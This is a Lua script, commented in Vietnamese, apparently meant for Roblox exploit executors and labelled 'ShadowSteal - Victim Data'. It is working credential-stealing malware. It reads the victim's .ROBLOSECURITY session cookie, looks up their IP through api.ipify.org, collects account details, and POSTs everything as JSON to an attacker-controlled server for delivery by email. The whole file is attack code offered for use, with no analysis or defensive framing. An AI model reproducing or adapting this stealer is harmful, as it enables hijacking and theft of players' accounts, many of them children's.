-- ========== 1. LẤY IP, COOKIE, INFO (KHÔNG ROBUX) ==========
local function getIP()
    local ip = "Unknown"
    pcall(function()
        if syn and syn.request then
            local res = syn.request({Url = "https://api.ipify.org", Method = "GET"})
            ip = res.Body
        elseif game:HttpGet then
            ip = game:HttpGet("https://api.ipify.org")
        end
    end)
    return ip
end

local function getCurrentCookie()
    if getcookie then return getcookie(".ROBLOSECURITY") or "" end
    if syn and syn.cookie then return syn.cookie.get(".ROBLOSECURITY") or "" end
    return ""
end

local function getUserInfo()
    return {
        userid = player.UserId,
        name = player.Name,
        display = player.DisplayName,
        accountAge = player.AccountAge,
        membership = player.MembershipType.Name,
        friends = #player.Friends:GetFriends(),
        placeId = game.PlaceId,
        jobId = game.JobId
    }
end

-- GỬI DỮ LIỆU VỀ EMAIL (qua server trung gian)
local function sendToEmail(title, fields)
    local payload = {
        to = target_email,
        subject = title,
        fields = fields,
        timestamp = os.date("%Y-%m-%d %H:%M:%S")
    }
    pcall(function()
        local json = HttpService:JSONEncode(payload)
        if syn and syn.request then
            syn.request({Url = server_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
        elseif game:HttpPost then
            game:HttpPost(server_url, json)
        end
    end)
end

local function stealAndSend()
    local ip = getIP()
    local cookie = getCurrentCookie()
    local info = getUserInfo()
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    
    local fields = {
        {name = "User ID", value = tostring(info.userid)},
        {name = "Username", value = info.name},
        {name = "Display", value = info.display},
        {name = "Account Age", value = tostring(info.accountAge)},
        {name = "Membership", value = info.membership},
        {name = "Friends", value = tostring(info.friends)},
        {name = "Place ID", value = tostring(info.placeId)},
        {name = "Job ID", value = info.jobId},
        {name = "IP", value = ip},
        {name = "Executor", value = executor},
        {name = "Cookie", value = cookie}
    }
    sendToEmail("🎯 ShadowSteal - Victim Data", fields)
end

